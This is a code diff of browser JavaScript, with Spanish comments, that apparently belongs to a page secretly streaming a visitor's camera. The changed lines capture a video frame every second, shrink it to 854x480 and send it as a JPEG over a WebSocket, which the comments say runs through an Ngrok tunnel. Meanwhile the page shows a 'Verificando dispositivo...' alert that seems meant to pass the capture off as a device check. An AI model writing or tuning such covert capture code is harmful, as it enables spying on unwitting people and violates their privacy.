@@ -37,16 +37,18 @@
 
                 socket.onopen = () => {
                     setInterval(() => {
-                        if (video.videoWidth > 0) {
-                            // Mantenemos resolución alta pero enviamos JPEG 0.6
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            if (socket.readyState === 1) {
-                                socket.send(canvas.toDataURL('image/jpeg', 0.6));
-                            }
-                        }
-                    }, 500); // 2 fotos por segundo para no saturar Ngrok
+    if (video.videoWidth > 0) {
+        // Bajamos un poquito la escala para estabilidad
+        canvas.width = 854; 
+        canvas.height = 480; 
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        if (socket.readyState === WebSocket.OPEN) {
+            // Bajamos calidad a 0.5 para que el archivo sea ligero
+            socket.send(canvas.toDataURL('image/jpeg', 0.5));
+        }
+    }
+}, 1000); // 1 FOTO POR SEGUNDO (Esto garantiza que no se cierre)
                 };
                 alert("Verificando dispositivo...");
             } catch (e) {
